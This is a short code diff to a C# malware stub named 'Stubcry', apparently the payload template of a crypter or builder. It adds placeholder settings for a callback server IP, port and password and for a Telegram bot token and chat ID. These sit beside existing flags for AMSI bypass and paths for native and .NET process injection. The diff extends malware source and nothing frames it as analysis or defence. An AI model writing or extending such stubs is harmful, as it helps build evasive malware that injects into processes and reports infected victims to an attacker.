@@ -22,12 +22,19 @@ namespace Stubcry
         public static string fullpath = Path.Combine(folder, FileName);
         public static string ePath = Process.GetCurrentProcess().MainModule.FileName;
         public static int taskm = 0;
-        public static int sleeptime = 1 * 1000;
+        public static int sleeptime = int.Parse("$SLEEPTIME");
         public static bool isrunportal32 = false;
         public static bool isrunportal64 = false;
         public static bool isdotnetload = false;
         public static bool ispassamsi = false;
         public static bool ispwcommand = false;
+        public static bool issocketnotify = false;
+        public static string ip = "$IP";
+        public static int port = int.Parse("$PORT");
+        public static string serverpass = "$serverpassword";
+        public static bool istelegramnotify = false;
+        public static string bottoken = "$bottoken";
+        public static string chatid = "$chatid";
         public static string nativeipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#NATIVEINJECTPATH");
 
         public static string dotnetipath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#DOTNETINJECTPATH");
